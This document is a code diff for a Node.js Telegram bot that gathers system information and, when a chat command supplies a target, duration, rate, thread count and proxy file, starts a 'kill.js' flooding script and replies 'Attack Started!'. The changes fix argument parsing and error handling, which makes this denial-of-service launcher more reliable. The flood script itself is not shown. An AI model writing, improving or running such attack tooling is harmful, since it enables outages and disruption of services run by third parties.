@@ -21,11 +21,12 @@ bot.onText(/\/system/, async (msg) => {
     const mem = await si.mem()
     const disk = await si.fsSize()
     const os = await si.osInfo()
+    const diskInfo = disk.length > 0 ? disk[0] : { fs: 'N/A', size: 0, used: 0 }
     const systemInfo = {
       OS: `${os.distro} ${os.release} (${os.arch})`,
       CPU: `${cpu.manufacturer} ${cpu.brand} (${cpu.cores} cores, ${cpu.speed} GHz)`,
       RAM: `${(mem.total / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(mem.used / 1024 / 1024 / 1024).toFixed(2)} GB used`,
-      Disk: `${disk[0].fs} ${(disk[0].size / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(disk[0].used / 1024 / 1024 / 1024).toFixed(2)} GB used`
+      Disk: `${diskInfo.fs} ${(diskInfo.size / 1024 / 1024 / 1024).toFixed(2)} GB total, ${(diskInfo.used / 1024 / 1024 / 1024).toFixed(2)} GB used`
     }
     bot.sendMessage(chatId, '```json\n' + JSON.stringify(systemInfo, null, 2) + '\n```', { parse_mode: 'Markdown' })
   } catch (err) {
@@ -56,7 +57,7 @@ bot.on('message', (msg) => {
     const [target, timeStr, rate, thread] = args
     const time = parseInt(timeStr)
 
-    if (!target || isNaN(time) || isNaN(rate) || isNaN(thread)) {
+    if (!target || isNaN(time) || isNaN(parseInt(rate)) || isNaN(parseInt(thread))) {
       bot.sendMessage(id, '```json\n' + JSON.stringify({ error: "Invalid arguments" }, null, 2) + '\n```', { parse_mode: 'Markdown' })
       return
     }
@@ -67,7 +68,7 @@ bot.on('message', (msg) => {
     }
 
     try {
-      const cmd = spawn('node', ['kill', target, time, rate, thread, 'prx.txt'])
+      const cmd = spawn('node', ['./kill.js', target, time, rate, thread, './prx.txt'])
       const response = {
         status: "Attack Started!",
         target,
@@ -78,19 +79,17 @@ bot.on('message', (msg) => {
       }
       bot.sendMessage(id, '```json\n' + JSON.stringify(response, null, 2) + '\n```', { parse_mode: 'Markdown' })
 
-      cmd.on('error', err => {
+      cmd.on('error', (err) => {
         bot.sendMessage(id, '```json\n' + JSON.stringify({ error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
       })
 
-      cmd.on('close', code => {
+      cmd.on('close', (code) => {
         bot.sendMessage(id, '```json\n' + JSON.stringify({ done: true, code }, null, 2) + '\n```', { parse_mode: 'Markdown' })
       })
     } catch (err) {
       bot.sendMessage(id, '```json\n' + JSON.stringify({ error: err.message }, null, 2) + '\n```', { parse_mode: 'Markdown' })
     }
-
-    return
   }
 })
 
-bot.on('polling_error', err => console.error(err.message))
+bot.on('polling_error', (err) => console.error('Polling error:', err.message))
